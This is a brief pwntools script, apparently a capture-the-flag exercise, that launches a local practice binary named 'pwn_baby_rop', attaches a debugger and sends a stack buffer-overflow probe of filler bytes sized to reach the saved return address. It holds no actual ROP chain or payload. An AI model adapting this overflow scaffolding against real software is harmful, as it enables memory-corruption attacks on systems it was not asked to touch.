from pwn import *

io = process("./pwn_baby_rop")

io.recvuntil("black magic.\n")

gdb.attach(io)

payload = b""
payload += b"A" * 256
payload += b"B" * 8
payload += b"C" * 8

io.sendline(payload)
io.interactive()
